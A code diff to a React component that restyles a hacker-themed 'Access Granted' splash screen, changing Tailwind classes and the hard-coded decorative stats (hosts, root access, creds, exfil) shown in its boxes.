-            className="text-green-400 text-2xl sm:text-3xl md:text-4xl font-bold mb-3 tracking-[0.3em]"
+            className="text-green-400 text-xl sm:text-2xl md:text-3xl font-bold mb-2 tracking-[0.2em]"
             style={{ textShadow: '0 0 20px rgba(0,255,0,0.6)' }}
           >
-            MILLER AI GROUP
+            ACCESS GRANTED
           </div>
 
-          <div className="text-green-600 text-lg mb-8">
-            Access Granted: <span className="text-green-400 font-bold">{userName}</span>
+          <div className="text-green-600 text-base mb-6">
+            Welcome, <span className="text-green-400 font-bold">{userName}</span>
           </div>
 
-          <div className="text-green-500 text-sm font-mono">
+          <div className="text-green-500 text-sm font-mono mb-8">
             root@miller-ai:~# <span className="animate-pulse">█</span>
           </div>
 
           {/* Stats */}
-          <div className="mt-10 flex justify-center gap-12 text-center">
-            <div className="border border-green-900/50 px-6 py-3 bg-black/50">
-              <div className="text-green-400 text-3xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>3</div>
-              <div className="text-green-700 text-xs uppercase tracking-widest">Ports</div>
+          <div className="flex flex-wrap justify-center gap-4 md:gap-8 text-center">
+            <div className="border border-green-900/50 px-4 py-2 bg-black/50 min-w-[80px]">
+              <div className="text-green-400 text-2xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>24</div>
+              <div className="text-green-700 text-[10px] uppercase tracking-widest">Hosts</div>
             </div>
-            <div className="border border-green-900/50 px-6 py-3 bg-black/50">
-              <div className="text-green-400 text-3xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>ROOT</div>
-              <div className="text-green-700 text-xs uppercase tracking-widest">Access</div>
+            <div className="border border-green-900/50 px-4 py-2 bg-black/50 min-w-[80px]">
+              <div className="text-green-400 text-2xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>ROOT</div>
+              <div className="text-green-700 text-[10px] uppercase tracking-widest">Access</div>
             </div>
-            <div className="border border-green-900/50 px-6 py-3 bg-black/50">
-              <div className="text-green-400 text-3xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>247</div>
-              <div className="text-green-700 text-xs uppercase tracking-widest">Creds</div>
+            <div className="border border-green-900/50 px-4 py-2 bg-black/50 min-w-[80px]">
+              <div className="text-green-400 text-2xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>1.2K</div>
+              <div className="text-green-700 text-[10px] uppercase tracking-widest">Creds</div>
+            </div>
+            <div className="border border-green-900/50 px-4 py-2 bg-black/50 min-w-[80px]">
+              <div className="text-green-400 text-2xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>3.2GB</div>
+              <div className="text-green-700 text-[10px] uppercase tracking-widest">Exfil</div>
             </div>
           </div>
         </div>
